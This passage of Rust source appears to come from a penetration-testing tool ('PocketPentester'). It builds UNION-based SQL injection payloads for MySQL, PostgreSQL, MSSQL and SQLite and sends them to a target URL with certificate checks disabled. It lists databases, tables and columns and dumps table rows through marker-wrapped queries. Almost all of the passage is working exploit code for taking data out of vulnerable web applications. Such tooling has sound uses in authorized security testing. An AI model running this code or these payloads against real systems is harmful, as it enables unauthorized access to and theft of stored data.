            let d_lit = match db { Some(x) if !x.is_empty() => format!("'{}'", esc_sq(x)), _ => "database()".into() };
            format!("(SELECT GROUP_CONCAT(table_name SEPARATOR 0x7c) FROM information_schema.tables WHERE table_schema={d_lit})")
        }
        ("MySQL", "columns") => {
            let d_lit = match db { Some(x) if !x.is_empty() => format!("'{}'", esc_sq(x)), _ => "database()".into() };
            let t = table.unwrap_or("");
            format!("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x7c) FROM information_schema.columns WHERE table_schema={} AND table_name='{}')", d_lit, esc_sq(t))
        }
        ("MySQL", "rows") => {
            let t = table.unwrap_or("");
            let qn = match db {
                Some(x) if !x.is_empty() => format!("`{}`.`{}`", x.replace('`', ""), t.replace('`', "")),
                _ => format!("`{}`", t.replace('`', "")),
            };
            let cl: Vec<String> = cols.iter().map(|c| format!("IFNULL(`{}`,'')", c.replace('`', ""))).collect();
            let concat = format!("CONCAT_WS(0x7f,{})", cl.join(","));
            format!("(SELECT GROUP_CONCAT({} SEPARATOR 0x7c) FROM (SELECT * FROM {} LIMIT {} OFFSET {}) x)", concat, qn, limit, offset)
        }

        ("PostgreSQL", "databases") =>
            "(SELECT string_agg(datname,'|') FROM pg_database WHERE datistemplate=false)".into(),
        ("PostgreSQL", "tables") => {
            let d_lit = match db { Some(x) if !x.is_empty() => format!("'{}'", esc_sq(x)), _ => "current_schema()".into() };
            format!("(SELECT string_agg(tablename,'|') FROM pg_tables WHERE schemaname={})", d_lit)
        }
        ("PostgreSQL", "columns") => {
            let d_lit = match db { Some(x) if !x.is_empty() => format!("'{}'", esc_sq(x)), _ => "current_schema()".into() };
            let t = table.unwrap_or("");
            format!("(SELECT string_agg(column_name,'|') FROM information_schema.columns WHERE table_schema={} AND table_name='{}')", d_lit, esc_sq(t))
        }
        ("PostgreSQL", "rows") => {
            let t = table.unwrap_or("");
            let qn = match db {
                Some(x) if !x.is_empty() => format!("\"{}\".\"{}\"", x.replace('"', ""), t.replace('"', "")),
                _ => format!("\"{}\"", t.replace('"', "")),
            };
            let cl: Vec<String> = cols.iter().map(|c| format!("COALESCE(\"{}\"::text,'')", c.replace('"', ""))).collect();
            let concat = cl.join("||chr(127)||");
            format!("(SELECT string_agg({}, '|') FROM (SELECT * FROM {} LIMIT {} OFFSET {}) x)", concat, qn, limit, offset)
        }

        ("MSSQL", "databases") =>
            "(SELECT STRING_AGG(name,'|') FROM master.sys.databases)".into(),
        ("MSSQL", "tables") => {
            match db { Some(x) if !x.is_empty() =>
                format!("(SELECT STRING_AGG(name,'|') FROM {}.sys.tables)", x.replace('[', "").replace(']', "")),
                _ => "(SELECT STRING_AGG(name,'|') FROM sys.tables)".into()
            }
        }
        ("MSSQL", "columns") => {
            let t = table.unwrap_or("");
            format!("(SELECT STRING_AGG(name,'|') FROM sys.columns WHERE object_id=OBJECT_ID('{}'))", esc_sq(t))
        }
        ("MSSQL", "rows") => {
            let t = table.unwrap_or("");
            let qn = match db {
                Some(x) if !x.is_empty() => format!("[{}].[dbo].[{}]", x.replace('[', "").replace(']', ""), t.replace('[', "").replace(']', "")),
                _ => format!("[{}]", t.replace('[', "").replace(']', "")),
            };
            let cl: Vec<String> = cols.iter().map(|c| format!("ISNULL(CAST([{}] AS NVARCHAR(MAX)),'')", c.replace('[', "").replace(']', ""))).collect();
            let concat = cl.join("+CHAR(127)+");
            format!("(SELECT STRING_AGG({}, '|') FROM (SELECT TOP {} * FROM {}) x)", concat, limit, qn)
        }

        ("SQLite", "databases") => "(SELECT 'main')".into(),
        ("SQLite", "tables") =>
            "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table')".into(),
        ("SQLite", "columns") => {
            let t = table.unwrap_or("");
            format!("(SELECT group_concat(name,'|') FROM pragma_table_info('{}'))", esc_sq(t))
        }
        ("SQLite", "rows") => {
            let t = table.unwrap_or("");
            let cl: Vec<String> = cols.iter().map(|c| format!("ifnull(\"{}\",'')", c.replace('"', ""))).collect();
            let concat = cl.join("||char(127)||");
            format!("(SELECT group_concat({}, '|') FROM (SELECT * FROM \"{}\" LIMIT {} OFFSET {}) x)", concat, t.replace('"', ""), limit, offset)
        }

        (_, "custom") => custom.unwrap_or("NULL").to_string(),
        _ => "NULL".into(),
    }
}

fn esc_sq(s: &str) -> String { s.replace('\'', "''") }

fn wrap_marker(dbms: &str, marker: &str, expr: &str) -> String {
    match dbms {
        // MySQL: CHAR(n,n,...) — marker bytes never appear in raw payload,
        // so apps that reflect the GET/POST param (e.g. <h1><?= $id ?>)
        // can't false-positive our regex.
        "MySQL" => {
            let m = mysql_char_literal(marker);
            format!("CONCAT({m},{e},{m})", m = m, e = expr)
        }
        "PostgreSQL" | "SQLite" => format!("('{m}'||({e})||'{m}')", m = marker, e = expr),
        "MSSQL" => format!("('{m}' + CAST(({e}) AS NVARCHAR(MAX)) + '{m}')", m = marker, e = expr),
        _ => expr.to_string(),
    }
}

fn parse_dump_captured(action: &str, captured: &str, cols: &Option<Vec<String>>) -> (Vec<String>, Vec<Vec<String>>) {
    if captured.is_empty() { return (Vec::new(), Vec::new()); }
    match action {
        "databases" | "tables" | "columns" => {
            let header = match action { "databases" => "database", "tables" => "table", _ => "column" };
            let rows: Vec<Vec<String>> = captured.split('|')
                .filter(|s| !s.is_empty())
                .map(|s| vec![s.to_string()])
                .collect();
            (vec![header.into()], rows)
        }
        "rows" => {
            let hdr = cols.clone().unwrap_or_default();
            let rows: Vec<Vec<String>> = captured.split('|')
                .filter(|s| !s.is_empty())
                .map(|r| r.split('\u{7f}').map(String::from).collect())
                .collect();
            (hdr, rows)
        }
        _ => (vec!["result".into()], vec![vec![captured.to_string()]]),
    }
}

// ------------------------------------------------------------------
// On-demand UNION probe — used when dump is requested on an
// error/boolean/time finding that never ran union during the scan
// (e.g. stop_on_first stopped at error-based).
// ------------------------------------------------------------------

#[derive(Debug, Clone, Deserialize)]
pub struct SqliProbeUnionRequest {
    pub url: String,
    #[serde(default = "default_method")]
    pub method: String,
    #[serde(default)]
    pub body: Option<String>,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    #[serde(default)]
    pub cookies: Option<String>,
    pub param: String,
    pub location: String,
    pub base_value: String,
    #[serde(default = "default_level")]
    pub level: u8,
    #[serde(default)]
    pub tamper: Vec<String>,
    #[serde(default = "default_timeout")]
    pub timeout_ms: u64,
    #[serde(default = "default_true")]
    pub follow_redirects: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct SqliProbeUnionResult {
    pub prefix: String,
    pub cols: usize,
    pub position: usize,
    pub dbms: Option<String>,
    pub extracted: HashMap<String, String>,
}

pub async fn sqli_probe_union(_app: AppHandle, req: SqliProbeUnionRequest) -> Result<SqliProbeUnionResult, String> {
    let url = Url::parse(&req.url).map_err(|e| e.to_string())?;
    let body_is_json = req.headers.iter().any(|(k, v)|
        k.eq_ignore_ascii_case("content-type") && v.to_lowercase().contains("json"));
    let target = Target {
        url, method: req.method, body: req.body, body_is_json,
        headers: req.headers, cookies: req.cookies,
    };
    let point = InjectionPoint { location: req.location, name: req.param, base_value: req.base_value };
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(req.timeout_ms))
        .redirect(if req.follow_redirects { reqwest::redirect::Policy::limited(5) } else { reqwest::redirect::Policy::none() })
        .cookie_store(false)
        .user_agent("Mozilla/5.0 (PocketPentester-SQLi/probe)")
        .build()
        .map_err(|e| e.to_string())?;

    match test_union_based(&client, &target, &point, req.level, &req.tamper).await {
        Some((prefix, _suffix, _payload, _evidence, dbms, extracted, cols, position)) => {
            Ok(SqliProbeUnionResult {
                prefix, cols, position,
                dbms: dbms.map(|s| s.to_string()),
                extracted,
            })
        }
        None => Err("union probe failed — ORDER BY column count not found or UNION blocked".into()),
    }
}

pub async fn sqli_dump(app: AppHandle, req: SqliDumpRequest) -> Result<SqliDumpResult, String> {
    let url = Url::parse(&req.url).map_err(|e| e.to_string())?;
    let body_is_json = req.headers.iter().any(|(k, v)|
        k.eq_ignore_ascii_case("content-type") && v.to_lowercase().contains("json"));

    let target = Target {
        url, method: req.method.clone(), body: req.body.clone(), body_is_json,
        headers: req.headers.clone(), cookies: req.cookies.clone(),
    };
    let point = InjectionPoint {
        location: req.location.clone(),
        name: req.param.clone(),
        base_value: req.base_value.clone(),
    };

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(req.timeout_ms))
        .redirect(if req.follow_redirects { reqwest::redirect::Policy::limited(5) } else { reqwest::redirect::Policy::none() })
        .cookie_store(false)
        .user_agent("Mozilla/5.0 (PocketPentester-SQLi/dump)")
        .build()
        .map_err(|e| e.to_string())?;

    let dbms = normalize_dbms(&req.dbms).to_string();
    let marker = format!("xpl{:04}dmp", rand::random::<u16>());
    let subq = dump_expr(
        &dbms, &req.action,
        req.database.as_deref(), req.table.as_deref(),
        req.columns.as_deref().unwrap_or(&[]),
        req.limit, req.offset, req.custom_sql.as_deref(),
    );
    let wrapped = wrap_marker(&dbms, &marker, &subq);

    let cols_count = req.cols.max(1);
    let pos = req.position.max(1).min(cols_count);
    let fields: Vec<String> = (1..=cols_count)
        .map(|i| if i == pos { wrapped.clone() } else { "NULL".into() })
        .collect();
    // Use a non-matching base value so the UNION row is the first result
    // the app renders (same strategy as test_union_based).
    let null_base = if point.base_value.chars().all(|c| c.is_ascii_digit()) {
        format!("-{}", point.base_value)
    } else {
        format!("{} AND 1=2", point.base_value)
    };
    let injected = apply_tamper(
        &format!("{}{} UNION SELECT {}-- -", null_base, req.prefix, fields.join(",")),
        &req.tamper,
    );

    let _ = app.emit("sqli:dump:status",
        format!("→ {} · dbms={} · marker={} · {}col@{}", req.action, dbms, marker, cols_count, pos));

    let (body, status, elapsed) = send(&client, &target, &point, &injected).await
        .ok_or_else(|| "request failed or timed out".to_string())?;

    let re = Regex::new(&format!("{m}([\\s\\S]+?){m}", m = regex::escape(&marker)))
        .map_err(|e| e.to_string())?;
    let captured = re.captures(&body)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str().to_string())
        .unwrap_or_default();

    if captured.is_empty() {
        // surface backend errors so the UI can show what went wrong
        let snippet = if body.len() > 400 {
            format!("{}...", body.chars().take(400).collect::<String>())
        } else { body.clone() };
        return Err(format!("no marker in response (status={} elapsed={}ms). body: {}", status, elapsed, snippet));
    }

    let (headers, rows) = parse_dump_captured(&req.action, &captured, &req.columns);
    let count = rows.len();

    // GROUP_CONCAT / STRING_AGG truncation hints
    let truncated = match dbms.as_str() {
        "MySQL" => captured.len() > 1020,   // default group_concat_max_len = 1024
        _ => false,
    };

    Ok(SqliDumpResult {
        dbms: dbms.clone(),
        action: req.action.clone(),
        headers,
        rows,
        count,
        truncated,
        raw_payload: injected,
        raw_captured: captured,
    })
}
